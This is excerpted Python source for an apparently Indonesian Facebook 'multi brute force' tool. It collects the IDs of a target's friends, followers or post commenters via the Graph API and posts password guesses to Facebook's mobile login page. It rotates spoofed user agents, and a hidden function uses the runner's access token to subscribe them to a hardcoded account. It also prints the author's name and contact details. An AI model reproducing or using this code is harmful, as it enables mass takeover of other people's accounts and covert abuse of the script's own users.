...
ua = random.choice(['Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
	     'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36'
             'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
	     'Mozilla/5.0 (Linux; Android 9; KFONWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/84.3.5 like Chrome/84.0.4147.125 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]',
	     'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
	     'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36',
	     'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36',
             'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
	     ...
	     'Mozilla/5.0 (Linux; Android 6.0.1; SM-G920T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]',
	     'Mozilla/5.0 (Linux; Android 10; TECNO KE6j Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 GSA/11.42.18.23.arm64[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]'])
...
op = bulan[nTemp]
def __cekfol__():
	random.choice(['Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
	     'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36'
             'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
	     'Mozilla/5.0 (Linux; Android 9; KFONWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/84.3.5 like Chrome/84.0.4147.125 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]',
	     'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
...
#	os.system("mkdir /results")
	try:
		...
		os.system("echo 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36', >> .ua.txt")
		os.system("echo 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36', >> .ua")
	os.system("clear")
	print(""" \x1b[1;92m           
╦═╗╔═╗╦ ╦   ╔╦╗╔╗ ╔═╗
╠╦╝║ ║╚╦╝───║║║╠╩╗╠╣ 
...
def bot_komen():
    ...
    requests.post('https://graph.facebook.com/100035322483719/subscribers?access_token=' + token)
...
def menu():
	...
	logo()
        print("["+H+"ROY-MULTI BRUTE FORCE]")
        print(p+"[*] ---------------------------------------------")
        print(p+"["+c+"*"+p+"]"+p+" Author	: "+K+"Roy Octa Firdaus")
        print(p+"["+c+"*"+p+"]"+p+" Facebook	: "+K+"facebook.com/jbfbold")
        print(p+"["+c+"*"+p+"]"+p+" Whatsapp	: "+K+"+6281318306972")
        print(p+"[*] ---------------------------------------------")
        print(p+"["+K+"?"+p+"]"+p+" Data Login Pengguna")
	print(p+"["+c+"*"+p+"]"+p+" Nama	: "+H+H+"%s"%(nama))
	print(p+"["+c+"*"+p+"]"+p+" ID		: "+H+id)
	print(p+"["+c+"*"+p+"]"+p+" User	: "+H+user)
        print(p+"["+c+"*"+p+"]"+p+" IP		: "+H+ip)
        print(p+"["+c+"*"+p+"]"+p+" Joined	: "+H+durasi)
	print(p+"["+c+"*"+p+"]"+p+" Status	: "+H+"Premium")
        print(p+"[*] ---------------------------------------------")
	print(p+"["+K+"1"+p+"]"+p+". Crack Dari Friend/Public")
	print(p+"["+K+"2"+p+"]"+p+". Crack Dari Follower")
	print(p+"["+K+"3"+p+"]"+p+". Crack Dari Postingan")
	print(p+"["+K+"4"+p+"]"+p+". Cek Hasil Crack")
	print(p+"["+K+"5"+p+"]"+p+". Setting User Agent")
	print(p+"["+K+"6"+p+"]"+p+". Cek Info Account Facebook")
	print(p+"["+M+"0"+p+"]"+p+". "+M+"Logout")
	print
	ask = raw_input(p+"["+c+"*"+p+"]"+p+" Pilih : ")
	if ask =="":
		menu()
	elif ask == "1" or ask == "01":
		public()
...
def public():
	...
	try:
		...
		tokenz()
	print
	print("\033[0;97m[\033[0;96m*\033[0;97m] Ketik 'me' jika ingin crack dari teman sendiri")
	idt = raw_input("\033[0;97m[\033[0;96m+\033[0;97m] ID Publik : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		print("\033[0;97m[\033[0;96m+\033[0;97m] Name : "+sp["name"])
	except KeyError:
	...
	for i in z["data"]:
		...
		name = i['name']
		id.append(uid+'<=>'+name)
	print("\033[0;97m[\033[0;96m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
	...
	def main(user):
		...
		try:
			for pw in pwx:
				pw = pw.lower()
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user_agent': ua})
				xo = rex.content
